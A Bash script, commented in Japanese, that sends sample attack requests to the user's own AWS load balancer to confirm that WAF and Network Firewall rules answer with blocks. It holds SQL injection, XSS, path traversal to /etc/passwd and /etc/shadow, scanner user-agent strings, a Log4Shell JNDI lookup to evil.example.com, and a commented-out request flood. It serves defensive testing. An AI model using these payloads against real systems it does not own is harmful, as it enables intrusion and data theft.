#!/bin/bash
# 模擬攻撃スクリプト（WAF・Network Firewall のブロック動作確認用）
# 使用方法: ./scripts/attack_simulation.sh {ALB_DNS}
#
# ⚠️  自分が所有するリソースに対してのみ実行すること。
# ⚠️  第三者のサービスに対して実行することは不正アクセス禁止法に違反する。

set -euo pipefail

ALB_DNS="${1:-}"
if [[ -z "$ALB_DNS" ]]; then
  echo "Usage: $0 <alb-dns>"
  exit 1
fi

BASE_URL="http://${ALB_DNS}"
PASS_COUNT=0
FAIL_COUNT=0

check_blocked() {
  local description="$1"
  local status="$2"
  if [[ "$status" == "403" ]]; then
    echo "✅ BLOCKED (403): $description"
    (( PASS_COUNT++ ))
  elif [[ "$status" == "000" ]]; then
    echo "✅ BLOCKED (connection refused/timeout): $description"
    (( PASS_COUNT++ ))
  else
    echo "❌ NOT BLOCKED ($status): $description"
    (( FAIL_COUNT++ ))
  fi
}

echo "======================================"
echo "WAF・Network Firewall ブロック動作確認"
echo "Target: $BASE_URL"
echo "======================================"
echo ""

# ---- SQL インジェクション ----
echo "--- SQL インジェクション試行 ---"

STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  --max-time 10 \
  "${BASE_URL}/?id=1'+OR+'1'='1" || echo "000")
check_blocked "Classic OR-based SQLi" "$STATUS"

STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  --max-time 10 \
  "${BASE_URL}/?q=SELECT+*+FROM+users+WHERE+1=1" || echo "000")
check_blocked "SELECT FROM SQLi" "$STATUS"

STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  --max-time 10 \
  "${BASE_URL}/?id=1+UNION+SELECT+1,2,3--" || echo "000")
check_blocked "UNION SELECT SQLi" "$STATUS"

STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  --max-time 10 \
  "${BASE_URL}/?id=1;DROP+TABLE+users--" || echo "000")
check_blocked "DROP TABLE SQLi" "$STATUS"

echo ""

# ---- XSS ----
echo "--- XSS 試行 ---"

STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  --max-time 10 \
  "${BASE_URL}/?name=<script>alert(1)</script>" || echo "000")
check_blocked "Reflected XSS (script tag)" "$STATUS"

STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  --max-time 10 \
  "${BASE_URL}/?name=<img+src=x+onerror=alert(1)>" || echo "000")
check_blocked "XSS (img onerror)" "$STATUS"

STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  --max-time 10 \
  -H "X-Forwarded-For: <script>alert(1)</script>" \
  "${BASE_URL}/" || echo "000")
check_blocked "XSS in header" "$STATUS"

echo ""

# ---- ディレクトリトラバーサル ----
echo "--- ディレクトリトラバーサル試行 ---"

STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  --max-time 10 \
  "${BASE_URL}/../../../etc/passwd" || echo "000")
check_blocked "Path traversal (etc/passwd)" "$STATUS"

STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  --max-time 10 \
  "${BASE_URL}/?file=../../etc/shadow" || echo "000")
check_blocked "Path traversal in query" "$STATUS"

echo ""

# ---- スキャナー UA ----
# WAF カスタムルール (BlockScannerUA) は "sqlmap" のみ BLOCK。
# Nikto は WAF CRS のバージョンによりブロックされる場合がある。
# masscan/nmap は WAF ではブロックされない（NFW IPS が担当するが ALB 直接ではスコープ外）。
echo "--- スキャナー User-Agent 試行 ---"

STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  --max-time 10 \
  -H "User-Agent: sqlmap/1.7" \
  "${BASE_URL}/" || echo "000")
check_blocked "WAF カスタムルール: sqlmap/1.7" "$STATUS"

STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  --max-time 10 \
  -H "User-Agent: Nikto/2.1.6" \
  "${BASE_URL}/" || echo "000")
check_blocked "WAF CRS: Nikto/2.1.6 (CRS バージョンにより結果が異なる)" "$STATUS"

echo ""

# ---- Log4Shell ----
echo "--- Log4Shell 試行 ---"

STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  --max-time 10 \
  -H 'X-Api-Version: ${jndi:ldap://evil.example.com/a}' \
  "${BASE_URL}/" || echo "000")
check_blocked "Log4Shell (jndi:ldap)" "$STATUS"

echo ""

# ---- レートベースルール（オプション：コメントアウト推奨） ----
# echo "--- レートベースルール試行（5分で 2000 req 超） ---"
# for i in $(seq 1 100); do
#   curl -s -o /dev/null "${BASE_URL}/" &
# done
# wait
# echo "100 req 送信完了（2000 req/5分 未満のため通常はブロックされない）"

echo ""
echo "======================================"
echo "テスト完了"
echo "  BLOCKED (PASS): $PASS_COUNT"
echo "  NOT BLOCKED (FAIL): $FAIL_COUNT"
echo ""
echo "SQLi / XSS / パストラバーサル / Log4Shell が 403 なら WAF が正常に動作しています。"
echo "スキャナー UA は WAF カスタムルールで sqlmap のみ確実にブロックされます。"
echo ""
echo "CloudWatch Logs で詳細なブロック理由を確認:"
echo "  WAF Log: aws-waf-logs-amf-alb"
echo "======================================"

if (( FAIL_COUNT > 0 )); then
  exit 1
fi
